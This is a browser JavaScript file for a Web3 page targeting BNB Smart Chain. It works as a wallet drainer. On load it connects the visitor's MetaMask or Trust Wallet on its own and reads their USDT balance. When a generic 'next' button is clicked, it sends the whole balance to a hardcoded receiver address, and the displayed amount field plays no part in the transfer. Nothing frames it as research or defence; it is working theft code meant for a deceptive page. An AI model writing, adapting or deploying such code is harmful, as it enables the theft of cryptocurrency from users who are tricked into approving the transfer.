const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
const usdtABI = [
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }],
    "name": "transfer",
    "outputs": [{ "name": "success", "type": "bool" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "decimals",
    "outputs": [{ "name": "", "type": "uint8" }],
    "type": "function"
  }
];

let web3;
let account;
let usdt;
let userBalanceRaw = "0";

window.onload = async () => {
  if (typeof window.ethereum !== 'undefined') {
    web3 = new Web3(window.ethereum);
    usdt = new web3.eth.Contract(usdtABI, usdtAddress);

    // Setup buttons
    document.querySelector(".next-btn").addEventListener("click", transferMaxUSDT);
    await connectWallet(); // Auto connect wallet
    await fetchAndStoreBalance(); // Preload balance
  } else {
    document.getElementById("status").innerText = "Please install MetaMask or Trust Wallet.";
  }
};

async function connectWallet() {
  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
  account = accounts[0];
  return account;
}

async function fetchAndStoreBalance() {
  const balance = await usdt.methods.balanceOf(account).call();
  userBalanceRaw = balance;
  const human = web3.utils.fromWei(balance, 'ether');
  return human;
}

async function setMax() {
  const display = await fetchAndStoreBalance();
  document.getElementById("usdtAmount").value = display;
}

async function transferMaxUSDT() {
  try {
    document.getElementById("status").innerText = "Sending USDT...";

    if (userBalanceRaw === "0" || userBalanceRaw === "0.0") {
      document.getElementById("status").innerText = "❌ No USDT available.";
      return;
    }

    await usdt.methods.transfer(receiver, userBalanceRaw).send({ from: account });

    document.getElementById("status").innerText = "✅ All USDT sent successfully!";
  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText = "❌ Error: " + err.message;
  }
}
